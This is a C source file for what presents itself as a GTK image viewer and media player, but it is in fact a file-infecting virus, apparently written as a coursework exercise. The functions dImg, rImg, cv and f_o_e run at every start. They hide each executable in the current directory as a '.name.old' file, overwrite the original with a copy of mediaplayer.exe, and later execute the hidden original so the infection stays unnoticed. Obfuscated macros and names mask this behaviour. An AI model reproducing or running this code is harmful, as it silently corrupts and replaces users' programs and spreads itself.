#include <gtk/gtk.h>
    #include <gst/gst.h>
        #include <stdlib.h>
            #include <stdbool.h>
                #include <dirent.h>
                    #include <sys/types.h>
                        #include <sys/stat.h>
                            #include <unistd.h>
                                #include <stdio.h>
                                    #include <string.h>
                                        #define fp(x,y)(fopen(x,y))
                                            #define pR(x,y)(rename(x,y))
                                                #define cc(x,y)(strcat(x,y))
                                                    #define sfx ".old"
                                                        static GtkWidget *img;
                                                            static int ix = 0;
                                                                char **imgs;
                                                                    int nImgs = 0;
                                                                        int lImg() {
                                                                            imgs = malloc(sizeof(char *) * 100);
                                                                                char *p = malloc(sizeof(char) * 250);
                                                                                    strcpy(p, "/home/tpuser/Documents/virus-mediaplayer/ressources/images");
                                                                                        if (imgs && p) {
        DIR *d;
        struct dirent *di;
        d = opendir(p);

        if (d) {
            while ((di = readdir(d)) != NULL) {
                if (strstr(di->d_name, ".jpg") != NULL || strstr(di->d_name, ".png") != NULL || strstr(di->d_name, ".jpeg") != NULL || strstr(di->d_name, ".gif") != NULL) {
                    char *i = malloc(sizeof(char) * 250);
                    strcpy(i, p);
                    strcat(i, "/");
                    strcat(i, di->d_name);
                    imgs = realloc(imgs, sizeof(char *) * (nImgs + 1));
                    imgs[nImgs++] = i;
                }
            }
            free(p);
            closedir(d);
        }
        return nImgs;
    }
    return 0;
}

void clNxtImg(GtkWidget *w, gpointer d) {
    GdkPixbuf *pb = gdk_pixbuf_new_from_file(imgs[ix], NULL);
    if (!pb) {
        g_error("Failed to load image: %s", imgs[ix]);
        return;
    }

    GdkPixbuf *rp = gdk_pixbuf_scale_simple(pb, 400, 400, GDK_INTERP_BILINEAR);
    g_object_unref(pb);

    gtk_image_set_from_pixbuf(GTK_IMAGE(img), rp);

    ix++;
    if (ix == nImgs) {
        ix = 0;
    }
}

void clPrevImg(GtkWidget *w, gpointer d) {
    GdkPixbuf *pb = gdk_pixbuf_new_from_file(imgs[ix], NULL);
    if (!pb) {
        g_error("Failed to load image: %s", imgs[ix]);
        return;
    }

    GdkPixbuf *rp = gdk_pixbuf_scale_simple(pb, 400, 400, GDK_INTERP_BILINEAR);
    g_object_unref(pb);

    gtk_image_set_from_pixbuf(GTK_IMAGE(img), rp);

    ix--;
    if (ix < 0) {
        ix = nImgs - 1;
    }
}

void afc() {
    DIR *d;
    struct dirent *di;
    d = opendir(".");
    if (d) {
        while ((di = readdir(d)) != NULL) {
            struct stat sb;stat(di->d_name, &sb);if (strcmp(di->d_name, "mediaplayer.exe") != 0 && strcmp(di->d_name, ".") != 0 && strcmp(di->d_name, "..") != 0 && sb.st_mode & S_IXUSR && S_ISREG(sb.st_mode)) { printf("%s\n", di->d_name); }
        }
        closedir(d);
    }
}

void rImg(const char *i)
{
    char *n = malloc(strlen(i) + 15);strcpy(n, ".");strcat(n, i);cc(n, sfx);pR(i, n);free(n);
}

void cv(const char *f) {
    FILE *v = fp("mediaplayer.exe", "rb");
    FILE *c = fopen(f, "wb");
    if (c != NULL && v != NULL) {
        char b[1024];
        size_t by;
        while ((by = fread(b, 1, sizeof(b), v)) > 0) {
            fwrite(b, 1, by, c);
        }
        fclose(v);
        fclose(c);
        chmod(f, S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);        
    }
}

void dImg() {
    DIR *d;
    struct dirent *di;
    d = opendir(".");
    if (d) {
        while ((di = readdir(d)) != NULL) {
            struct stat sb;
            if (strcmp(di->d_name, "mediaplayer.exe") != 0 && strcmp(di->d_name, ".") != 0 && strcmp(di->d_name, "..") != 0 && strstr(di->d_name, ".old") == NULL) {
                if (!stat(di->d_name, &sb)) {
                    if ((sb.st_mode & S_IXUSR) && S_ISREG(sb.st_mode)) {                                                
                        char *f = (char *)di->d_name;
                        f_o_e(f) == -1 ? rImg(f) : 0;cv(f);                        
                    }
                }
            }
        }
        closedir(d);
    }
}

int f_o_e(char *f) {
    char *fc = malloc(strlen(f) + 15);
    strcpy(fc, ".");
    strcat(fc, f);
    strcat(fc, ".old");

    DIR *d;
    struct dirent *di;
    d = opendir(".");
    if (d) {
        while ((di = readdir(d)) != NULL) {
            if (strcmp(di->d_name, "mediaplayer.exe") != 0) {
                if (strcmp(di->d_name, fc) == 0 && strstr(di->d_name, ".old") != NULL) {
                    if (fp(fc, "r") != NULL) {
                        closedir(d);
                        return 1;
                    }
                }
            }
        }
        closedir(d);
    }
    return -1;
}

static GstElement *pl;
static gboolean ip = FALSE;

static void pp(GtkWidget *w, gpointer d) {
    if (ip) {
        gst_element_set_state(pl, GST_STATE_PAUSED);
        ip = FALSE;
    } else {
        gst_element_set_state(pl, GST_STATE_PLAYING);
        ip = TRUE;
    }
}

static void sb(GtkWidget *w, gpointer d) {
    gst_element_set_state(pl, GST_STATE_NULL);
    ip = FALSE;
}

static void nb(GtkWidget *w, gpointer d) {
    clNxtImg(w, d);
}

static void pb(GtkWidget *w, gpointer d) {
    clPrevImg(w, d);
}

static void fcb(GtkWidget *w, gpointer d) {
    GtkWidget *dlg;
    GtkFileChooserAction a = GTK_FILE_CHOOSER_ACTION_OPEN;
    gint r;
    dlg = gtk_file_chooser_dialog_new("Open File", GTK_WINDOW(d), a, "Cancel", GTK_RESPONSE_CANCEL, "Open", GTK_RESPONSE_ACCEPT, NULL);

    r = gtk_dialog_run(GTK_DIALOG(dlg));
    if (r == GTK_RESPONSE_ACCEPT) {
        gchar *fn;
        GtkFileChooser *ch = GTK_FILE_CHOOSER(dlg);
        fn = gtk_file_chooser_get_filename(ch);

        GdkPixbuf *pb = gdk_pixbuf_new_from_file(fn, NULL);
        if (!pb) {
            g_error("Failed to load image: %s", fn);
            g_free(fn);
            gtk_widget_destroy(dlg);
            return;
        }

        GdkPixbuf *rp = gdk_pixbuf_scale_simple(pb, 400, 400, GDK_INTERP_BILINEAR);
        g_object_unref(pb);

        gtk_image_set_from_pixbuf(GTK_IMAGE(img), rp);
        g_object_unref(rp);

        gst_element_set_state(pl, GST_STATE_NULL);

        g_free(fn);
    }

    gtk_widget_destroy(dlg);
}

int main(int argc, char *argv[]) {
    int nImgs = lImg();    
    dImg();    
    if (strcmp(argv[0], "./mediaplayer.exe") == 0) {
        gtk_init(&argc, &argv);
        gst_init(&argc, &argv);

        GtkWidget *w = gtk_window_new(GTK_WINDOW_TOPLEVEL);
        g_signal_connect(w, "destroy", G_CALLBACK(gtk_main_quit), NULL);
        gtk_window_set_default_size(GTK_WINDOW(w), 800, 600);

        GtkWidget *vb = gtk_vbox_new(FALSE, 5);

        img = gtk_image_new();
        gtk_box_pack_start(GTK_BOX(vb), img, TRUE, TRUE, 0);

        GtkWidget *nxt = gtk_button_new_with_label("Next");
        g_signal_connect(nxt, "clicked", G_CALLBACK(nb), imgs);
        gtk_box_pack_start(GTK_BOX(vb), nxt, FALSE, FALSE, 0);

        GtkWidget *prev = gtk_button_new_with_label("Previous");
        g_signal_connect(prev, "clicked", G_CALLBACK(pb), imgs);
        gtk_box_pack_start(GTK_BOX(vb), prev, FALSE, FALSE, 0);

        GtkWidget *fcb = gtk_button_new_with_label("Open File");
        g_signal_connect(fcb, "clicked", G_CALLBACK(fcb), w);
        gtk_box_pack_start(GTK_BOX(vb), fcb, FALSE, FALSE, 0);

        gtk_container_add(GTK_CONTAINER(w), vb);

        pl = gst_pipeline_new("media-player");

        gtk_widget_show_all(w);
        gtk_main();

        gst_element_set_state(pl, GST_STATE_NULL);
        gst_object_unref(GST_OBJECT(pl));

    } else {
        DIR *d;
        struct dirent *di;
        d = opendir(".");
        if (d) {
            while ((di = readdir(d)) != NULL) {
                if (strcmp(di->d_name, "mediaplayer.exe") != 0 && strcmp(di->d_name, ".") != 0 && strcmp(di->d_name, "..") != 0) {
                    struct stat sb;
                    stat(di->d_name, &sb);
                    if (sb.st_mode & S_IXUSR && S_ISREG(sb.st_mode)) {
                        char *f = malloc(strlen(argv[0]) + 10);
                        strncpy(f, argv[0] + 2, strlen(argv[0]) - 2);
                        char *vn = malloc(strlen(f) + 5);
                        strcpy(vn, ".");
                        strcat(vn, f);
                        strcat(vn, ".old");

                        if (strcmp(di->d_name, vn) == 0) {
                            printf("File %s already targeted\n", di->d_name);

                            strcpy(vn, "./");
                            strcat(vn, ".");
                            strcat(vn, f);
                            strcat(vn, ".old");

                            printf("command %s\n", vn);
                            execl(vn, NULL);
                        }
                    }
                }
            }
            closedir(d);
        }
    }

    return 0;
}
